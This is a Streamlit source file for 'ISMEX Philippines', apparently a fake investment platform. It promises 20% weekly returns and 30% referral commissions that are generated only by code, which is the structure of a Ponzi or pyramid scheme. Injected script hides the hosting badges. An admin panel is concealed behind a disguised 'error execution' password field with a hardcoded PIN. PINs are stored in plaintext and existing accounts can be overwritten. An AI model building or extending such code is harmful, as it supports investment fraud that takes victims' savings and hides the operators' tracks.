import streamlit as st
from google.cloud import firestore
from google.oauth2 import service_account
from datetime import datetime, timedelta

# ==========================================
# 1. UI: THE "GITHUB FRONT-PAGE" WALL
# ==========================================
st.set_page_config(page_title="ISMEX Official", layout="wide")

st.markdown("""
    <style>
    header, [data-testid="stToolbar"], footer { visibility: hidden !important; }
    .stApp { background-color: #0e1117 !important; color: white; }
    
    /* THE UI: Balance Box & History Cards */
    .balance-box {
        background: linear-gradient(135deg, #1e222d 0%, #0e1117 100%);
        padding: 2.5rem;
        border-radius: 20px;
        border: 2px solid #00ff88;
        text-align: center;
        margin-bottom: 25px;
        box-shadow: 0 10px 30px rgba(0,255,136,0.1);
    }
    .hist-card {
        background: #1c2128;
        padding: 18px;
        border-radius: 12px;
        margin-bottom: 12px;
        border-left: 6px solid #00ff88;
    }
    
    /* CREATE SPACE FOR THE BOTTOM WALL */
    .main .block-container { padding-bottom: 280px !important; }
    </style>
    """, unsafe_allow_html=True)

# THE GITHUB INJECTION: Covers the streamlit/github icons in front
st.components.v1.html("""
    <script>
    const setupWall = () => {
        const root = window.parent.document;
        let wall = root.getElementById('ismex-master-wall');
        if (!wall) {
            wall = root.createElement('div');
            wall.id = 'ismex-master-wall';
            wall.style.cssText = `
                position: fixed !important;
                bottom: 0 !important;
                left: 0 !important;
                width: 100% !important;
                height: 115px !important;
                background: #0e1117 !important;
                z-index: 2147483647 !important;
                display: block !important;
                pointer-events: none !important;
            `;
            root.body.appendChild(wall);
        }
        // Force hide the badge
        const badge = root.querySelector('.viewerBadge_container__1QSob');
        if (badge) badge.style.opacity = '0';
    };
    setInterval(setupWall, 50);
    </script>
    """, height=0)

# ==========================================
# 2. LOGIC: DATABASE & REGISTRY
# ==========================================
@st.cache_resource
def get_db():
    if "firebase" in st.secrets:
        info = dict(st.secrets["firebase"])
        info["private_key"] = info["private_key"].replace("\\n", "\n")
        creds = service_account.Credentials.from_service_account_info(info)
        return firestore.Client(credentials=creds)
    return None

db = get_db()

def load_reg():
    return {doc.id: doc.to_dict() for doc in db.collection("investors").stream()}

def save(n, d):
    db.collection("investors").document(n).set(d)

# Session State
for k, v in [('user',None), ('page','landing'), ('is_boss',False), ('admin_mode',False), ('action',None)]:
    if k not in st.session_state: st.session_state[k] = v

if "ref" in st.query_params:
    st.session_state["ref_id"] = st.query_params["ref"].replace("+", " ").upper()

# ==========================================
# 3. LOGIC: THE 30% REFERRAL & 20% WEEKLY ROI
# ==========================================

# --- ADMIN VIEW ---
if st.session_state.is_boss:
    st.title("👑 ISMEX SYSTEM CONTROL")
    if st.button("EXIT ADMIN"): st.session_state.is_boss = False; st.rerun()
    
    reg = load_reg()
    for u, data in reg.items():
        pend = data.get('pending', [])
        for idx, act in enumerate(list(pend)):
            with st.expander(f"🔴 {act['type']} - {u}"):
                st.write(f"AMOUNT: ₱{act['amount']:,.2f}")
                if 'bank' in act: st.code(act['bank'])
                
                c1, c2 = st.columns(2)
                if c1.button("APPROVE", key=f"app_{u}_{idx}"):
                    ph_now = (datetime.now() + timedelta(hours=8)).isoformat()
                    if act['type'] in ["DEPOSIT", "REINVEST"]:
                        data.setdefault('inv', []).append({"amount": act['amount'], "date": ph_now})
                    # Update History
                    for h in data.get('history', []):
                        if h.get('id') == act.get('id'): h['status'] = "CONFIRMED"
                    data['pending'].pop(idx); save(u, data); st.rerun()
                
                if c2.button("REJECT", key=f"rej_{u}_{idx}"):
                    if act['type'] in ["WITHDRAW", "REINVEST"]: data['wallet'] = data.get('wallet',0) + act['amount']
                    data['pending'].pop(idx); save(u, data); st.rerun()

# --- USER VIEW ---
elif st.session_state.user:
    reg = load_reg()
    data = reg.get(st.session_state.user, {})
    wallet = float(data.get('wallet', 0))
    ph_now = datetime.now() + timedelta(hours=8)
    
    st.title(f"👋 {st.session_state.user}")
    st.markdown(f"<div class='balance-box'><p style='color:#888;'>AVAILABLE BALANCE</p><h1>₱{wallet:,.2f}</h1></div>", unsafe_allow_html=True)
    
    # UI: Action Buttons
    cols = st.columns(3)
    if cols[0].button("📥 DEPOSIT"): st.session_state.action = "DEP"
    if cols[1].button("📤 WITHDRAW"): st.session_state.action = "WIT"
    if cols[2].button("🔄 REINVEST"): st.session_state.action = "REI"

    # LOGIC: Forms
    if st.session_state.action == "DEP":
        with st.form("d"):
            amt = st.number_input("Enter Amount", 500.0)
            if st.form_submit_button("SUBMIT RECEIPT"):
                rid = ph_now.strftime("%f")
                data.setdefault('pending', []).append({"type": "DEPOSIT", "amount": amt, "id": rid})
                data.setdefault('history', []).append({"type": "DEPOSIT", "amount": amt, "id": rid, "status": "PENDING", "date": ph_now.strftime("%Y-%m-%d")})
                save(st.session_state.user, data); st.session_state.action = None; st.rerun()

    # LOGIC: The 30% Referral System
    st.markdown("---")
    st.subheader("👥 YOUR REFERRAL NETWORK")
    ref_url = f"https://ismex-philippines-internationalstockmarketexchange.streamlit.app/?ref={st.session_state.user.replace(' ','+')}"
    st.code(ref_url)
    
    total_comm = 0
    for name, u_data in reg.items():
        if u_data.get('ref_by') == st.session_state.user and u_data.get('inv'):
            # 30% of their FIRST deposit
            comm = u_data['inv'][0]['amount'] * 0.30
            total_comm += comm
            st.markdown(f"<div style='color:#00ff88;'>+ ₱{comm:,.2f} from {name}</div>", unsafe_allow_html=True)
    
    if total_comm > 0 and st.button("💸 WITHDRAW COMMISSION"):
        # Logic for comm withdraw...
        st.success(f"Requesting ₱{total_comm:,.2f}")

    # LOGIC: The 20% Weekly ROI System
    st.markdown("---")
    st.subheader("🚀 ACTIVE INVESTMENTS (20% WEEKLY)")
    invs = data.get('inv', [])
    for idx, i in enumerate(list(invs)):
        start_date = datetime.fromisoformat(i['date'])
        end_date = start_date + timedelta(days=7)
        roi = i['amount'] * 1.20 # 20% Profit + Capital
        
        progress = min(1.0, (ph_now - start_date).total_seconds() / (7 * 86400))
        st.markdown(f"**Capital: ₱{i['amount']:,.2f}** → **Target: ₱{roi:,.2f}**")
        st.progress(progress)
        
        if ph_now >= end_date:
            if st.button(f"CLAIM ROI ₱{roi:,.2f}", key=f"roi_{idx}"):
                data['wallet'] = wallet + roi
                data['inv'].pop(idx)
                save(st.session_state.user, data); st.rerun()

    if st.button("LOGOUT"): st.session_state.user = None; st.rerun()

# --- LANDING / AUTH ---
elif st.session_state.page == "auth":
    t1, t2 = st.tabs(["LOGIN", "REGISTER"])
    with t1:
        u_in = st.text_input("FULL NAME").upper().strip()
        p_in = st.text_input("PIN", type="password")
        if st.button("ENTER"):
            r = load_reg()
            if u_in in r and str(r[u_in]['pin']) == p_in:
                st.session_state.user = u_in; st.rerun()
    with t2:
        inv_by = st.session_state.get('ref_id', 'OFFICIAL')
        st.write(f"Invited by: {inv_by}")
        nu = st.text_input("NEW FULL NAME").upper().strip()
        np = st.text_input("SET 4-DIGIT PIN", type="password", max_chars=4)
        if st.button("REGISTER ACCOUNT"):
            save(nu, {"pin": np, "wallet": 0.0, "ref_by": inv_by, "inv": [], "history": [], "pending": []})
            st.success("Registered!"); st.session_state.page = "auth"
    if st.button("BACK"): st.session_state.page = "landing"; st.rerun()

else:
    st.title("ISMEX PHILIPPINES")
    if st.button("🚀 GET STARTED"): st.session_state.page = "auth"; st.rerun()
    if st.button("⛔"): st.session_state.admin_mode = not st.session_state.admin_mode
    if st.session_state.admin_mode:
        if st.text_input("''error execution''", type="password") == "0102030405":
            st.session_state.is_boss = True; st.rerun()
                
